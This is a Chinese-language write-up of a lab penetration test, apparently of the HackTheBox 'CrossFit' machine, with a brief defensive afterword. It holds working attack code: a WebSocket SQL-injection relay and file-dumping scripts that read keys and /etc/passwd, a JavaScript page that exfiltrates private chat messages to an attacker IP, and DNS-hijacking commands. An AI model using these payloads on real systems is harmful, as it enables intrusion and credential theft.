##  利用WebSocket接口中转注入渗透实战

windcctv  [ 乌雲安全 ](javascript:void\(0\);)

**乌雲安全** ![]()

微信号 hackctf

功能介绍
乌雲安全，致力于红队攻防实战、内网渗透、代码审计、社工、安卓逆向、CTF比赛技巧、安全运维等技术干货分享，并预警最新漏洞，定期分享常用渗透工具、教程等资源。

____

__

收录于话题

本次渗透实战的主要流程为：

> 1、信息收集，发现WebSocket接口；  
> 2、使用burp对WebSocket接口进行测试，发现存在sql注入漏洞；  
> 3、编写中转注入脚本，通过sqlmap跑出数据库内容，并读取重要的配置文件；  
> 4、通过unbound搭建DNS服务器，结合已有的配置文件，使用dnschef进行DNS欺骗；  
> 5、DNS流量劫持后获取了用户密码。

主要的知识点在于:基于WebSocket接口的sqlmap中转注入，DNS服务器的搭建与欺骗，下面开始此次渗透实战之旅。

## 信息收集

有真实的ip，那上来首先肯定是端口扫描一波，看看开了哪些服务：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175808.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210811175814.png)

单从端口上看，突破点应该在web服务，unbound这个服务后续在详细介绍。

在来一波目录扫描：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175815.png)

发现一些登录页面，逐一尝试并没有取得突破。

  * 

    
    
    wfuzz -u http://10.10.10.232 -H “Host: FUZZ.crossfit.htb” -w /root/Desktop/domain.txt

![](https://gitee.com/fuli009/images/raw/master/public/20210811175817.png)

发现了几个子域名，在etc/hosts文件里添加上：

  * 

    
    
    10.10.10.232 crossfit.htb employees.crossfit.htb gym.crossfit.htb crossfit-club.htb

逐个点开观察，终于在burp里看到一个有意思的东西；

![](https://gitee.com/fuli009/images/raw/master/public/20210811175818.png)之前接触的少，查阅一波资料后，简单介绍如下：

## WebSocket

初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？

答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。

举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。

这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用”轮询”：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。

轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket
就是这样发明的。

它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。

![](https://gitee.com/fuli009/images/raw/master/public/20210811175819.png)现在回到我们本次渗透；

> python3 -m websockets ws://gym.crossfit.htb/ws/

![]()

> python3 -m websockets ws://10.10.10.232/ws/

![](https://gitee.com/fuli009/images/raw/master/public/20210811175820.png)实际测试这两个效果是一样的，任选一个都可以。看到这种json格式的数据，联想到的就是sql注入、命令执行、反序列化等。

burp可以抓到websockets的包，（再次感叹神器的强大）

![]()还可以进行反复的修改；

![](https://gitee.com/fuli009/images/raw/master/public/20210811175821.png)最终测试出了参数params存在注入，上sqlmap试试，不行在自己写脚本。

## sqlmap中转注入

先试试直接sqlmap跑：

  * 

    
    
    sqlmap --url "ws://10.10.10.232/ws/" --data='{"params":"help","token":"a5e6c5aade60a2c4619893218280a45d2a142e3bcf583c8e1955c0b579f13009"}' -v 3 --dbs

无法成功。

![](https://gitee.com/fuli009/images/raw/master/public/20210811175822.png)看下payload；（有助于加深理解）

![](https://gitee.com/fuli009/images/raw/master/public/20210811175823.png)

![]()尝试多次都没有成功，后来详细研究了ws协议的传输过程，写了一个中转脚本；

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    from websocket import create_connectionimport refrom http.server import BaseHTTPRequestHandler, HTTPServerfrom urllib.parse import unquoteimport threadingfrom socketserver import ThreadingMixIn  
    hostname = "localhost"serverport = 9000  
    def xt(msg):    matches = re.findall(r'token":"(.*?)"', msg)    return matches[0]  
    def send_msg(msg):    resp = ""    ws = create_connection("ws://gym.crossfit.htb/ws")    resp =  ws.recv()    cur_token = xt(resp)    msg = unquote(msg)    msg = msg.replace('"', "'")    d = '{"message":"available","params":"'+msg+'","token":"' + cur_token + '"}'    print(d)    ws.send(d)    resp = ws.recv()    #print(resp)    matches = re.findall(r'message":"(.*?)"', resp)    print(matches[0])    return matches[0]  
    #send_msg("1 and 2=2-- -")#send_msg("1 and 'a'='a'-- -")#exit(0)  
    class Handler(BaseHTTPRequestHandler):  
        def do_GET(self):        self.send_response(200)        param = self.path[5:]        self.send_header('Content-Type', 'text')        self.end_headers()        resp = send_msg(param)        self.wfile.write(bytes(resp, "utf-8"))  
    class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):    pass  
    def run():    server = ThreadingSimpleServer(('0.0.0.0', 9000), Handler)  
        try:        server.serve_forever()    except KeyboardInterrupt:        pass  
    if __name__ == '__main__':    run()

期间经过反复测试、修改，具体过程不在赘述，大家看脚本就明白了。运行结果截图：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175824.png)看下payload：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175825.png)

  *   *   *   *   *   *   *   *   * 

    
    
    sqlmap -u http://127.0.0.1:9000/?id=1  --dbs --level 5 --risk 3  
    sqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "employees" -T employees -C username --dump  
    sqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "employees" -T employees -C password --dump  
    sqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "employees" -T employees -C email --dump  
    sqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "employees" -T employees -C email,token --dump --fresh-queries --threads 10

![]()

![](https://gitee.com/fuli009/images/raw/master/public/20210811175826.png)这里还可以读取文件，后面渗透需要用到；

![](https://gitee.com/fuli009/images/raw/master/public/20210811175827.png)

  *   *   *   *   *   *   *   * 

    
    
    sqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /etc/httpd.confsqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /etc/passwdsqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /var/unbound/etc/unbound.confsqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /var/unbound/etc/tls/unbound_server.keysqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /var/unbound/etc/tls/unbound_control.pemsqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /var/unbound/etc/tls/unbound_control.keysqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /var/unbound/etc/tls/unbound_server.pemsqlmap -u http://127.0.0.1:9000/?id=1  --level 5 --risk 3 -D "crossfit" -T "membership_plans" -C "password" --file-read /etc/relayd.conf

不用sqlmap的脚本：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #!/usr/bin/python3  
    import jsonfrom websocket import create_connection  
    ws = create_connection("ws://10.10.10.232/ws/")  
    r = ws.recv()t = json.loads(r)['token']  
    print("# Printing \"employees\" table to get emails ... ")ws.send("{\"message\":\"available\",\"params\":\"0 UNION ALL SELECT 1,GROUP_CONCAT(id,' ',username,' ',password,' ',email) from employees.employees-- -\",\"token\":\"" + t + "\"}")r = ws.recv()t = json.loads(r)['token']print ("{:<2} {:<13} {:<64} {:<32}".format("id","username","password","email"))for l in r[r.index("name: ")+6:len(r)-3].split(","):    a = l.split(" ")    print ("{:<2} {:<13} {:<64} {:<32}".format(a[0],a[1],a[2],a[3]))  
    print("\n# Downloading the \"/var/unbound/etc/unbound.conf\" file ... ", end="")ws.send("{\"message\":\"available\",\"params\":\"0 UNION ALL SELECT 1,HEX(LOAD_FILE('/var/unbound/etc/unbound.conf'))-- -\",\"token\":\"" + t + "\"}")r = ws.recv()t = json.loads(r)['token']with open('unbound.conf', 'w') as f:    f.write(bytearray.fromhex(r[r.index("name: ")+6:len(r)-3]).decode())print("DONE")  
    print("# Downloading the \"/var/unbound/db/root.key\" file ... ", end="")ws.send("{\"message\":\"available\",\"params\":\"0 UNION ALL SELECT 1,HEX(LOAD_FILE('/var/unbound/db/root.key'))-- -\",\"token\":\"" + t + "\"}")r = ws.recv()t = json.loads(r)['token']with open('root.key', 'w') as f:    f.write(bytearray.fromhex(r[r.index("name: ")+6:len(r)-3]).decode())print("DONE")  
    print("# Downloading the \"/var/unbound/etc/tls/unbound_server.pem\" file ... ", end="")ws.send("{\"message\":\"available\",\"params\":\"0 UNION ALL SELECT 1,HEX(LOAD_FILE('/var/unbound/etc/tls/unbound_server.pem'))-- -\",\"token\":\"" + t + "\"}")r = ws.recv()t = json.loads(r)['token']with open('unbound_server.pem', 'w') as f:    f.write(bytearray.fromhex(r[r.index("name: ")+6:len(r)-3]).decode())print("DONE")  
    print("# Downloading the \"/var/unbound/etc/tls/unbound_control.key\" file ... ", end="")ws.send("{\"message\":\"available\",\"params\":\"0 UNION ALL SELECT 1,HEX(LOAD_FILE('/var/unbound/etc/tls/unbound_control.key'))-- -\",\"token\":\"" + t + "\"}")r = ws.recv()t = json.loads(r)['token']with open('unbound_control.key', 'w') as f:    f.write(bytearray.fromhex(r[r.index("name: ")+6:len(r)-3]).decode())print("DONE")  
    print("# Downloading the \"/var/unbound/etc/tls/unbound_control.pem\" file ... ", end="")ws.send("{\"message\":\"available\",\"params\":\"0 UNION ALL SELECT 1,HEX(LOAD_FILE('/var/unbound/etc/tls/unbound_control.pem'))-- -\",\"token\":\"" + t + "\"}")r = ws.recv()with open('unbound_control.pem', 'w') as f:    f.write(bytearray.fromhex(r[r.index("name: ")+6:len(r)-3]).decode())print("DONE")  
    ws.close()

运行后结果如下：

![]()

拿到用户名和hash，破解一波没有结果，卡住了。

后来再次查看namp的扫描结果，有个8953端口运行着unbound服务，详细查阅了资料，明白了unbound的基本用法和原理，结合sqlmap可以读取文件，将unbound的所有配置文件读取到本地，就可以冒充DNS服务器，实现DNS欺骗。下面逐步来实现：

## unbound搭建DNS服务器

unbound是一款相对简单的DNS服务软件，相对于bind9的复杂配置，更适合新手搭建DNS服务器使用。

这里只简单作个使用的基本介绍，方便于理解后续的渗透思路。

先看看配置文件（作渗透对各种配置文件都要有深刻的理解）：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    配置unbound.conf文件  
    server:        verbosity: 1        num-threads: 2  #线程数        interface: 127.0.0.1 #监听地址（一般写本机内网ip）        interface: ::0        port: 53  #端口        so-reuseport: yes  #为每个线程的传入查询打开专用侦听套接字。可以更均匀地将传入查询分布到线程        cache-min-ttl: 60  #解析最小缓存时间        cache-max-ttl: 600 #解析最大缓存时间        outgoing-range: 8192        access-control: 10.0.0.0/8 allow  #访问控制（允许10段ip访问本机）        access-control: 127.0.0.1/8 allow  #允许本机访问        access-control: ::0/0 allow  #允许ipv6网段访问        prefetch: yes    #消息缓存元素在它们到期之前被预取以保持缓存是最新的        do-ip4: yes        do-ip6: yes        do-udp: yes        do-tcp: yes        so-rcvbuf: 8m        so-sndbuf: 8m        msg-cache-size: 64m   #消息缓存的字节数。默认值为4 MB。        rrset-cache-size: 128m   #RRset缓存的字节数。        outgoing-num-tcp: 256   #为每个线程分配的传出TCP缓冲区数        incoming-num-tcp: 1024   #为每个线程分配的传入TCP缓冲区数        include: "zone.conf"   #zone.conf文件内容为解析内容，如local-data: "m.baidu.com A 192.168.10.1"，也可以使用下面注释的方式配置解析#        local-data: "m.baidu.com 600 A 192.168.10.1"  #其中600为解析缓存时间#python:remote-control:    #这个区间为unbound控制设置。配置如下内容可以控制unbound服务，利用unbound-control命令对该服务执行开启、关闭、重启等操作。        control-enable: yes        control-interface: 127.0.0.1        control-port: 8953        server-key-file: "/usr/local/unbound/etc/unbound/unbound_server.key"        server-cert-file: "/usr/local/unbound/etc/unbound/unbound_server.pem"        control-key-file: "/usr/local/unbound/etc/unbound/unbound_control.key"        control-cert-file: "/usr/local/unbound/etc/unbound/unbound_control.pem"forward-zone:     #这个区间为转发设置        name: "."        forward-addr: 8.8.8.8

启动服务

首先执行./sbin/unbound-checkconf检查配置文件语法，确认无误后进行下一步；

执行/sbin/unbound-control-setup生成秘钥，之后才能使用/sbin/unbound-control命令；

最后执行./sbin/unbound启动服务。

Linux客户端测试。在客户端修改/etc/resolv.conf文件,将DNS服务器的IP地址指向上述所配置的授权DNS服务器的IP地址。

![](https://gitee.com/fuli009/images/raw/master/public/20210811175828.png)使用nslookup命令验证DNS查询结果

![]()

可见我们的DNS服务已经运行成功。

在本次渗透中不用那么复杂，根据上面的测试能理解软件的运行效果就可以了，接下来继续我们的渗透：

在kali里运行：

  * 

    
    
    sudo apt install unbound

新建文件：

  * 

    
    
    touch local_zones.conf

之前下载的unbound的配置文件unbound.conf如下：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175829.png)修改为自己的路径：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175830.png)在kali的apache2网页目录下写入如下2个文件：

  * 

    
    
    echo "<html><head></head><body><script>window.location=\"http://xcrossfit.htb/go.html\";</script><p>Redirecting ...</p></body></html>" > /var/www/html/password-reset.php

![]()

  * 

    
    
    echo "<html><head><script src=\"http://crossfit-club.htb/socket.io/socket.io.js\"></script><script>var s = io.connect(\"http://crossfit-club.htb\");s.emit(\"user_join\", { username : \"Admin\" });s.on(\"private_recv\", (d) => {var xhr = new XMLHttpRequest();xhr.open(\"GET\", \"http://10.10.16.9/get.php?s=\" + btoa(JSON.stringify(d)), true);xhr.send();});</script></head><body><p>Getting data ...</p></body></html>" > /var/www/html/go.html

![](https://gitee.com/fuli009/images/raw/master/public/20210811175831.png)开启apache2服务；

  * 

    
    
    service apache2 start

访问测试下：

![]()

没问题，下面开启DNS服务；

unbound-control的基本命令格式：

  * 

    
    
    unbound-control -c my_unbound.conf -s 10.10.10.232@8953 forward_add +i some.attacker.htb. @53

在kali终端里运行：

  *   * 

    
    
    unbound-control -c ./unbound.conf -s 10.10.10.232@8953 forward_add +i xemployees.crossfit.htb. 10.10.16.14@53; sleep 2;unbound-control -c ./unbound.conf -s 10.10.10.232@8953 forward_add +i xcrossfit.htb. 10.10.16.14@53

![](https://gitee.com/fuli009/images/raw/master/public/20210811175833.png)

在hosts里把这两个域名也加上；

> 10.10.10.232 crossfit.htb employees.crossfit.htb gym.crossfit.htb crossfit-
> club.htb xcrossfit.htb xemployees.crossfit.htb

## DNS欺骗

这里使用DNSChef这款软件来进行DNS欺骗，下载地址：https://github.com/iphelix/dnschef

DNSChef旨在为渗透测试人员和恶意软件分析师提供一个高度可配置的DNS代理。DNS代理（也称为“Fake DNS”）是用于应用程序

网络流量分析以及其他用途的工具。例如，DNS代理可以用于伪造对“badguy.com”的请求使其指向本地机器来终止或拦截，而不是指向Internet上的某个真实主机。

先测试下基本用法：

window修改dns服务器：

![]()

  * 

    
    
    dnschef —fakeip=192.168.200.2 —fakedomains=www.baidu.com,www.qq.com —interface 192.168.200.243

fackip欺骗到指定的ip，facedomains欺骗域名

![](https://gitee.com/fuli009/images/raw/master/public/20210811175834.png)

成功实现了DNS欺骗。

在本次渗透测试中运行如下命令：

> python3 dnschef.py -i 10.10.16.14 —fakedomains xemployees.crossfit.htb
> —fakeip 127.0.0.1 —count 2; sleep 1; python3 dnschef.py -i 10.10.16.14
> —fakedomains xcrossfit.htb,xemployees.crossfit.htb —fakeip 10.10.16.14

![](https://gitee.com/fuli009/images/raw/master/public/20210811175835.png)这里渗透的思路就是：既然我们获取了目标服务器的DNS配置文件，那我们就利用unbound搭建一个DNS服务器，配置与目标服务器相同。在利用DNSChef工具来进行DNS欺骗，将受害机器的DNS流量全部引导到我们自己搭建的DNS服务器上，实现了流量的劫持，并可以对关键数据进行拦截与分析，引导受害机器运行我们定义的恶意代码。

## 获取用户密码

利用前面获取的用户名，在kali终端里运行：

  * 

    
    
    curl -s -X "POST" -H "Host: xemployees.crossfit.htb" -H "Content-Type: application/x-www-form-urlencoded" -d "email=david.palmer%40crossfit.htb" "http://10.10.10.232/password-reset.php"

看下DNSChef的运行情况：

![]()查看apache日志/var/log/apache2/access.log，就可以发现；

  * 

    
    
    10.10.10.232 - - [19/Jul/2021:21:03:31 -0400] "GET /get.php?s=eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6MjcxOX0= HTTP/1.1" 404 489 "http://xcrossfit.htb/go.html" "Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0"

![](https://gitee.com/fuli009/images/raw/master/public/20210811175836.png)对这段base64解码后可得：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175837.png)获取了用户的密码，然后ssh登录：

![](https://gitee.com/fuli009/images/raw/master/public/20210811175838.png)至此，本次渗透就暂告一段落了，后续的提权渗透主要是利用suid方法进行，不是本篇文章的主题，网上各种例子也很多，这里就不在赘述。

## 后记

对于SQL注入，目前实战中已经很难找到原生态的SQL注入漏洞了，遇到的基本都是需要作变形或转换的。从SQL注入本质来理解，就是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。因此无论SQL注入以哪种形态或协议（是http(s)还是websocket），最终回归到本质，就是要对用户的输入进行合法性检测，SQL注入的方式或协议只是载体，起决定作用的还是用户的输入。

基于此思想，为了预防利用websocket进行SQL注入，可以采用两种方法：

一是加强对用户输入内容的检查与验证;

二是强迫使用参数化语句来传递用户输入的内容。

在本次渗透实战中，如果没有SQL注入漏洞，就无法获取DNS服务器的配置文件，自然也就无法实现DNS欺骗，但核心还是对用户输入数据的合法性没有判断，导致SQL注入漏洞的存在，与websocket协议没有直接的关系，本文只是提供了一种基于websocket协议进行SQL注入的方法，并在此基础上实现了DNS欺骗，渗透思路有亮点，记录下来与大家共同学习。

![](https://gitee.com/fuli009/images/raw/master/public/20210811175839.png)

作者：windcctv，文章来源：FreeBuf

 **推荐阅读**[
**![](https://gitee.com/fuli009/images/raw/master/public/20210811175840.png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247497658&idx=1&sn=87d6b678c3dab4baeeb28ca81276d333&chksm=9acd2725adbaae334bd016bf907ed651a1b1529279a04cb45aad101025d2f09a4637e8810072&scene=21#wechat_redirect)  
 **觉得不错点个 **“赞”** 、“在看”，支持下小编**
**![](https://gitee.com/fuli009/images/raw/master/public/20210811175841.png)**

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

利用WebSocket接口中转注入渗透实战

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

